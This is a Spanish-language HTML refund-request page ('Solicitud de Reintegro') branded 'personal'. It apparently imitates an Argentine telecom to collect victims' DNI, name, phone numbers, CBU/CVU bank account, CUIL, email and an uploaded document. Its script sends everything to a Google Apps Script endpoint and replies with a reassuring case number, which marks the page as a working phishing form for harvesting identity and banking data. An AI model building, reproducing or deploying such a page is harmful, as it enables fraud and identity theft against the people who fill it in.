<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Solicitud de Reintegro</title>

<style>

body{
margin:0;
font-family:Arial;
background:linear-gradient(135deg,#1fa2d6,#2bc0e4);
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.container{
background:white;
width:420px;
padding:35px;
border-radius:12px;
box-shadow:0 15px 40px rgba(0,0,0,0.2);
text-align:center;
}

.logo{
font-size:32px;
color:#00a9e0;
font-weight:bold;
margin-bottom:10px;
}

input{
width:100%;
padding:10px;
margin-bottom:12px;
border-radius:8px;
border:1px solid #ccc;
}

button{
width:100%;
padding:13px;
background:#00a9e0;
color:white;
border:none;
border-radius:8px;
font-weight:bold;
cursor:pointer;
}

.result{
display:none;
margin-top:20px;
}

.case{
font-size:20px;
font-weight:bold;
margin-top:10px;
}

</style>
</head>

<body>

<div class="container">

<div class="logo">personal</div>

<h2>Solicitud de Reintegro</h2>

<form id="form">

<input id="dni" placeholder="DNI del titular" required>

<input id="nombre" placeholder="Nombre del titular" required>

<input id="telefono_cliente" placeholder="N° de contacto del cliente" required>

<input id="cbu" placeholder="CBU / CVU" required>

<input id="cuil" placeholder="CUIL titular de la cuenta" required>

<input type="file" id="file">

<input id="telefono" placeholder="N° de contacto" required>

<input id="email" placeholder="Correo electrónico" required>

<button type="submit">Enviar solicitud</button>

</form>

<div class="result" id="result"></div>

</div>

<script>

const scriptURL="https://script.google.com/macros/s/AKfycbwnGEc7kIKVFvkBIF7M6T_Sk8aM7UDkDKX4VoFvO3wrn9eEnBw_ZTAtFsbv-O4XNqt1yQ/exec"

const form=document.getElementById("form")
const result=document.getElementById("result")

form.addEventListener("submit",async e=>{

e.preventDefault()

const file=document.getElementById("file").files[0]

let base64=""

if(file){

const reader=new FileReader()

reader.onload=async function(){

base64=reader.result.split(",")[1]

send(base64)

}

reader.readAsDataURL(file)

}else{

send("")

}

})

function send(base64){

const data={
dni:document.getElementById("dni").value,
nombre:document.getElementById("nombre").value,
telefono_cliente:document.getElementById("telefono_cliente").value,
cbu:document.getElementById("cbu").value,
cuil:document.getElementById("cuil").value,
telefono:document.getElementById("telefono").value,
email:document.getElementById("email").value,
comprobante:base64
}

fetch(scriptURL,{
method:"POST",
body:JSON.stringify(data)
})
.then(res=>res.text())
.then(res=>{

form.style.display="none"
result.style.display="block"

if(res==="YA_EXISTE"){

result.innerHTML=`
<div style="font-size:45px;color:red">✖</div>
<div>Ya registraste una solicitud en las últimas 24hs.</div>
<div>Esta gestión puede llevar hasta 7 días hábiles para su resolución.</div>
`

}else{

result.innerHTML=`
<div style="font-size:45px;color:green">✔</div>
<div>Número de caso</div>
<div class="case">${res}</div>
<div>Esta gestión puede llevar hasta 7 días hábiles para su resolución.</div>
`

}

})

}

</script>

</body>
</html>
